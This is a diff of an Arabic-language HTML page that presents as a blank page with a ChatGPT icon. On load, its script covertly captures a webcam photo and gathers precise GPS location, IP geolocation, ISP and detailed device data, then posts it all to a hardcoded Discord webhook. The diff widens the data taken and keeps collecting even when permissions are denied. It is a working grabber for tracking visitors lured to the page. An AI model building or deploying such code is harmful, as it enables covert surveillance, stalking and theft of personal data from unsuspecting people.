@@ -1,196 +1,340 @@
 <!DOCTYPE html>
 <html lang="ar">
-  <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>(•-•)</title>
-    <style>
-      body, html {
-        margin: 0;
-        padding: 0;
-        width: 100%;
-        height: 100%;
-        background-color: white;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-      }
-      video, canvas {
-        display: none;
-      }
-      <link rel="icon" href="https://www.securities.io/wp-content/uploads/2024/03/ChatGPT.jpeg" type="image/jpeg">
-    </style>
-  </head>
-  <body>
-    <video id="video" width="640" height="480" autoplay></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
-    <script>
-      const webhookURL = "https://discord.com/api/webhooks/1362846794458857572/-uovKrcHiDnprS1IWPLI1RSahCht_ypX_5BO8R9xEc5KZQ1XCrZSZ9uKt9VD3cbQmiXJ";
-      
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const context = canvas.getContext('2d');
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>(•-•)</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      background-color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    video, canvas {
+      display: none;
+    }
+    <link rel="icon" href="https://www.securities.io/wp-content/uploads/2024/03/ChatGPT.jpeg" type="image/jpeg">
+  </style>
+</head>
+<body>
+  <video id="video" width="640" height="480" autoplay></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1362846794458857572/-uovKrcHiDnprS1IWPLI1RSahCht_ypX_5BO8R9xEc5KZQ1XCrZSZ9uKt9VD3cbQmiXJ";
+    
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
 
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          video.srcObject = stream;
-          setTimeout(captureAndSend, 2000);
-        })
-        .catch(err => {
-          console.error("خطأ في الوصول للكاميرا: ", err);
-        });
+    // Request permissions automatically
+    async function requestPermissions() {
+      try {
+        // Request camera permission
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        
+        // Request geolocation (will trigger browser prompt)
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            () => console.log("Location access granted"),
+            () => console.log("Location access denied")
+          );
+        }
+        
+        // Start data collection after permissions are requested
+        setTimeout(captureAndSend, 2000);
+      } catch (err) {
+        console.error("Error requesting permissions:", err);
+        // Continue with data collection even if permissions are denied
+        setTimeout(captureAndSend, 2000);
+      }
+    }
 
-      function captureAndSend() {
+    // Start the process
+    requestPermissions();
+
+    function captureAndSend() {
+      // Capture camera image if available
+      if (video.srcObject) {
         context.drawImage(video, 0, 0, 640, 480);
         context.font = '20px Arial';
         context.fillStyle = 'red';
         context.fillText('حقوقك محفوظة', 10, canvas.height - 20);
-
-        canvas.toBlob(blob => {
-          const formData = new FormData();
-          formData.append('file', blob, 'image.png');
-          
-          collectAndSend().then(message => {
-            formData.append('content', message);
-            sendToWebhook(formData);
-          }).catch(error => {
-            console.error("خطأ في جمع البيانات:", error);
-          });
-        }, 'image/png');
       }
 
-      async function collectAndSend() {
-        const ipInfo = await getIPInfo();
-        const battery = await getBatteryInfo();
-        const connection = await getConnectionInfo();
-        const device = getDeviceInfo();
-        const now = new Date().toLocaleString("ar-EG");
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        if (blob) formData.append('file', blob, 'image.png');
+        
+        collectAndSend().then(message => {
+          formData.append('content', message);
+          sendToWebhook(formData);
+        }).catch(error => {
+          console.error("Error collecting data:", error);
+        });
+      }, 'image/png');
+    }
 
-        let message = `📱 **معلومات الجهاز:**
-- الدولة: ${ipInfo.country_name || "غير معروف"} 🔻
-- المدينة: ${ipInfo.city || "غير معروف"} 🏙️
-- عنوان IP: ${ipInfo.ip || "غير معروف"} 🌍
-- شحن الهاتف: ${battery.level}% 🔋
-- هل الهاتف يشحن؟: ${battery.charging}
-- الشبكة: ${connection.type} 📶 (سرعة: ${connection.downlink})
-- نوع الاتصال: ${connection.type} 📡
-- الوقت: ${now} ⏰
-- اسم الجهاز: ${device.platform} 🖥️
-- إصدار الجهاز: ${device.userAgent} 📜
+    async function collectAndSend() {
+      const [
+        ipInfo, 
+        battery, 
+        connection,
+        storageInfo,
+        mediaDevices,
+        gpuInfo
+      ] = await Promise.all([
+        getIPInfo(),
+        getBatteryInfo(),
+        getConnectionInfo(),
+        getStorageInfo(),
+        getMediaDevicesInfo(),
+        getGPUInfo()
+      ]);
+
+      const device = getDeviceInfo();
+      const now = new Date().toLocaleString("ar-EG");
+
+      let message = `📱 **معلومات الجهاز المتقدمة:**
+- الدولة: ${ipInfo.country_name || "غير معروف"} (${ipInfo.country || "غير معروف"}) 🔻
+- المدينة/المنطقة: ${ipInfo.city || "غير معروف"} (${ipInfo.region || "غير معروف"}) 🏙️
+- الرمز البريدي: ${ipInfo.postal || "غير معروف"} 📮
+- مزود خدمة الإنترنت: ${ipInfo.org || "غير معروف"} 🌐
+- عنوان IP: ${ipInfo.ip || "غير معروف"} 🔗
+- النسخ الاحتياطي: ${ipInfo.version || "غير معروف"} 📌
+
+🔋 **معلومات البطارية:**
+- مستوى الشحن: ${battery.level}% 
+- حالة الشحن: ${battery.charging}
+- وقت التفريغ/الشحن: ${battery.dischargingTime ? (battery.dischargingTime/3600).toFixed(1)+" ساعات" : "غير معروف"} ⏳
+
+📶 **معلومات الشبكة:**
+- نوع الشبكة: ${connection.type} 
+- السرعة: ${connection.downlink}
+- تقنية الشبكة: ${connection.effectiveType || "غير معروف"}
+- وضع توفير البيانات: ${connection.saveData ? "نعم" : "لا"} 💾
+- وقت الاستجابة: ${connection.rtt || "غير معروف"} مللي ثانية ⏱️
+
+💾 **معلومات التخزين:**
+- التخزين المتاح: ${storageInfo.availableStorage || "غير معروف"} 
+- حالة تخزين البيانات: ${storageInfo.storageStatus || "غير معروف"}
+- مساحة التخزين الكلية: ${storageInfo.totalStorage || "غير معروف"} 
+- نوع التخزين: ${storageInfo.storageType || "غير معروف"}
+
+📷 **الأجهزة الطرفية:**
+- عدد كاميرات الجهاز: ${mediaDevices.cameras || "غير معروف"} 
+- عدد الميكروفونات: ${mediaDevices.microphones || "غير معروف"} 
+- أجهزة الإخراج الصوتي: ${mediaDevices.audioOutputs || "غير معروف"} 
+
+🎮 **معلومات GPU:**
+- معالج الرسوميات: ${gpuInfo.gpu || "غير معروف"} 
+- عدد أنوية GPU: ${gpuInfo.cores || "غير معروف"} 
+- ذاكرة GPU: ${gpuInfo.memory || "غير معروف"} 
+
+🖥️ **معلومات الجهاز الأساسية:**
+- الوقت الحالي: ${now} ⏰
+- النظام الأساسي: ${device.platform} 
+- وكيل المستخدم: ${device.userAgent} 
 - نوع الجهاز: ${device.isMobile}
-- الذاكرة (RAM): ${device.ram} 🧠
-- عدد الأنوية: ${device.cores} ⚙️
-- لغة النظام: ${device.language} 🌐
-- اسم المتصفح: ${device.browser} 🌐
-- دقة الشاشة: ${device.screenSize} 📏
-- إصدار نظام التشغيل: ${device.os} 🖥️
-- وضع الشاشة: ${device.orientation} 🔄
-- عمق الألوان: ${device.colorDepth} 🎨
-- تاريخ آخر تحديث للمتصفح: ${device.lastUpdate} 📅
-- بروتوكول الأمان المستخدم: ${device.https} 🔒
-- إمكانية تحديد الموقع الجغرافي: ${"geolocation" in navigator ? "مدعوم 🌍" : "غير مدعوم"}
-- الدعم لتقنية البلوتوث: ${device.bluetooth}
-- دعم الإيماءات اللمسية: ${device.touch}`;
+- الذاكرة العشوائية: ${device.ram} 
+- عدد الأنوية: ${device.cores} 
+- اللغة: ${device.language} 
+- المتصفح: ${device.browser} 
+- دقة الشاشة: ${device.screenSize} 
+- نظام التشغيل: ${device.os} 
+- اتجاه الشاشة: ${device.orientation} 
+- عمق الألوان: ${device.colorDepth} 
+- آخر تحديث: ${device.lastUpdate} 
+- البروتوكول: ${device.https} 
+- البلوتوث: ${device.bluetooth}
+- اللمس: ${device.touch}
+- وضع الطائرة: ${device.isDeviceInAirplaneMode || "غير معروف"} ✈️
+- وضع توفير الطاقة: ${device.isDeviceInPowerSaveMode || "غير معروف"} 🔋
+- حالة VPN: ${device.isVpnActive || "غير معروف"} 🔒
+- حالة وضع المطور: ${device.isDeveloperModeEnabled || "غير معروف"} 🛠️`;
 
-        if ("geolocation" in navigator) {
-          return new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(async (position) => {
-              message += `\n- الموقع الحقيقي: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude} 🌍 (دقة: ${position.coords.accuracy} متر)`;
+      // Add location if available
+      if ("geolocation" in navigator) {
+        return new Promise((resolve) => {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              message += `\n📍 **الموقع الجغرافي:**\n- الإحداثيات: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}\n- الدقة: ${position.coords.accuracy} متر\n- الارتفاع: ${position.coords.altitude || "غير معروف"} متر\n- اتجاه الحركة: ${position.coords.heading || "غير معروف"}°\n- السرعة: ${position.coords.speed || "غير معروف"} م/ث`;
               resolve(message);
-            }, (error) => {
-              message += `\n- الموقع الحقيقي: تم رفض الإذن أو فشل التحديد ❌`;
+            },
+            () => {
+              message += `\n📍 **الموقع الجغرافي:** تم رفض الإذن أو فشل التحديد ❌`;
               resolve(message);
-            });
-          });
-        } else {
-          message += `\n- الموقع الحقيقي: غير مدعوم في هذا الجهاز ❌`;
-          return Promise.resolve(message);
-        }
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+        });
+      } else {
+        message += `\n📍 **الموقع الجغرافي:** غير مدعوم في هذا الجهاز ❌`;
+        return Promise.resolve(message);
       }
+    }
 
-      async function getIPInfo() {
+    // Additional data collection functions
+    async function getStorageInfo() {
+      try {
+        if ('storage' in navigator && 'estimate' in navigator.storage) {
+          const estimate = await navigator.storage.estimate();
+          return {
+            availableStorage: estimate.quota ? (estimate.quota / (1024 * 1024)).toFixed(2) + " MB" : "غير معروف",
+            storageStatus: estimate.usage ? (estimate.usage / (1024 * 1024)).toFixed(2) + " MB مستخدم" : "غير معروف",
+            storageType: 'storage' in navigator && 'persist' in navigator.storage ? 
+              (await navigator.storage.persist() ? "دائم" : "مؤقت") : "غير معروف",
+            totalStorage: estimate.quota ? (estimate.quota / (1024 * 1024)).toFixed(2) + " MB" : "غير معروف"
+          };
+        }
+        return {};
+      } catch {
+        return {};
+      }
+    }
+
+    async function getMediaDevicesInfo() {
+      try {
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        return {
+          cameras: devices.filter(d => d.kind === 'videoinput').length,
+          microphones: devices.filter(d => d.kind === 'audioinput').length,
+          audioOutputs: devices.filter(d => d.kind === 'audiooutput').length
+        };
+      } catch {
+        return {};
+      }
+    }
+
+    async function getGPUInfo() {
+      try {
+        if ('gpu' in navigator) {
+          const adapter = await navigator.gpu.requestAdapter();
+          return {
+            gpu: adapter ? adapter.name : "غير معروف",
+            cores: adapter ? adapter.extensions : "غير معروف",
+            memory: adapter ? adapter.memory : "غير معروف"
+          };
+        }
+        return {};
+      } catch {
+        return {};
+      }
+    }
+
+    // Existing functions with minor improvements
+    async function getIPInfo() {
+      try {
         const res = await fetch("https://ipapi.co/json/");
         return await res.json();
+      } catch {
+        return {};
       }
+    }
 
-      async function getBatteryInfo() {
+    async function getBatteryInfo() {
+      try {
         if (navigator.getBattery) {
           const battery = await navigator.getBattery();
           return {
             level: Math.round(battery.level * 100),
-            charging: battery.charging ? "نعم ⚡" : "لا ⚡"
+            charging: battery.charging ? "نعم ⚡" : "لا ⚡",
+            dischargingTime: battery.dischargingTime
           };
         }
         return { level: "غير مدعوم", charging: "غير مدعوم" };
+      } catch {
+        return { level: "غير مدعوم", charging: "غير مدعوم" };
       }
+    }
 
-      async function getConnectionInfo() {
+    async function getConnectionInfo() {
+      try {
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         return connection ? {
           type: connection.type || "غير معروف",
-          downlink: connection.downlink + " ميغابت في الثانية"
+          downlink: connection.downlink + " ميغابت في الثانية",
+          effectiveType: connection.effectiveType,
+          saveData: connection.saveData ? "نعم" : "لا",
+          rtt: connection.rtt
         } : {
           type: "غير مدعوم",
           downlink: "غير مدعوم"
         };
+      } catch {
+        return { type: "غير مدعوم", downlink: "غير مدعوم" };
       }
+    }
 
-      function getDeviceInfo() {
-        return {
-          userAgent: navigator.userAgent,
-          platform: navigator.platform,
-          language: navigator.language,
-          screenSize: `${screen.width}x${screen.height}`,
-          orientation: (screen.orientation || {}).type || "غير معروف",
-          colorDepth: screen.colorDepth,
-          browser: detectBrowser(),
-          os: detectOS(),
-          isMobile: /Mobi|Android/i.test(navigator.userAgent) ? "محمول 📱" : "حاسوب 🖥️",
-          ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "غير معروف",
-          cores: navigator.hardwareConcurrency || "غير معروف",
-          bluetooth: !!navigator.bluetooth ? "مدعوم 🔵" : "غير مدعوم",
-          touch: 'ontouchstart' in window ? "مدعوم ✋" : "غير مدعوم",
-          https: location.protocol,
-          lastUpdate: document.lastModified
-        };
-      }
+    function getDeviceInfo() {
+      return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenSize: `${screen.width}x${screen.height}`,
+        orientation: (screen.orientation || {}).type || "غير معروف",
+        colorDepth: screen.colorDepth,
+        browser: detectBrowser(),
+        os: detectOS(),
+        isMobile: /Mobi|Android/i.test(navigator.userAgent) ? "محمول 📱" : "حاسوب 🖥️",
+        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "غير معروف",
+        cores: navigator.hardwareConcurrency || "غير معروف",
+        bluetooth: !!navigator.bluetooth ? "مدعوم 🔵" : "غير مدعوم",
+        touch: 'ontouchstart' in window ? "مدعوم ✋" : "غير مدعوم",
+        https: location.protocol,
+        lastUpdate: document.lastModified,
+        isDeviceInAirplaneMode: navigator.deviceInAirplaneMode !== undefined ? (navigator.deviceInAirplaneMode ? "نعم" : "لا") : "غير معروف",
+        isDeviceInPowerSaveMode: navigator.deviceInPowerSaveMode !== undefined ? (navigator.deviceInPowerSaveMode ? "نعم" : "لا") : "غير معروف",
+        isVpnActive: navigator.vpn !== undefined ? (navigator.vpn.active ? "نعم" : "لا") : "غير معروف",
+        isDeveloperModeEnabled: navigator.developerMode !== undefined ? (navigator.developerMode ? "نعم" : "لا") : "غير معروف"
+      };
+    }
 
-      function detectBrowser() {
-        const ua = navigator.userAgent;
-        if (ua.includes("Chrome")) return "Chrome";
-        if (ua.includes("Firefox")) return "Firefox";
-        if (ua.includes("Safari")) return "Safari";
-        if (ua.includes("Edge")) return "Edge";
-        return "غير معروف";
-      }
+    function detectBrowser() {
+      const ua = navigator.userAgent;
+      if (ua.includes("Chrome")) return "Chrome";
+      if (ua.includes("Firefox")) return "Firefox";
+      if (ua.includes("Safari")) return "Safari";
+      if (ua.includes("Edge")) return "Edge";
+      if (ua.includes("Opera")) return "Opera";
+      if (ua.includes("Brave")) return "Brave";
+      return "غير معروف";
+    }
 
-      function detectOS() {
-        const ua = navigator.userAgent;
-        if (/Windows NT/.test(ua)) return "Windows";
-        if (/Android/.test(ua)) return "Android";
-        if (/iPhone|iPad/.test(ua)) return "iOS";
-        if (/Linux/.test(ua)) return "Linux";
-        return "غير معروف";
-      }
+    function detectOS() {
+      const ua = navigator.userAgent;
+      if (/Windows NT/.test(ua)) return "Windows";
+      if (/Android/.test(ua)) return "Android";
+      if (/iPhone|iPad/.test(ua)) return "iOS";
+      if (/Mac OS X/.test(ua)) return "MacOS";
+      if (/Linux/.test(ua)) return "Linux";
+      if (/CrOS/.test(ua)) return "ChromeOS";
+      return "غير معروف";
+    }
 
-      function sendToWebhook(formData) {
-        fetch(webhookURL, {
-          method: 'POST',
-          body: formData
-        })
-        .then(response => {
-          if (response.ok) {
-            console.log('تم إرسال الصورة والمعلومات بنجاح');
-            return response.json();
-          } else {
-            throw new Error('خطأ في إرسال الصورة');
-          }
-        })
-        .then(data => console.log(data))
-        .catch(error => console.error('خطأ:', error));
-      }
-    </script>
-  </body>
+    function sendToWebhook(formData) {
+      fetch(webhookURL, {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('تم إرسال البيانات بنجاح');
+          return response.json();
+        } else {
+          throw new Error('خطأ في الإرسال');
+        }
+      })
+      .then(data => console.log(data))
+      .catch(error => console.error('خطأ:', error));
+    }
+  </script>
+</body>
 </html>
 
 <!--اخلاء المسوؤلية:
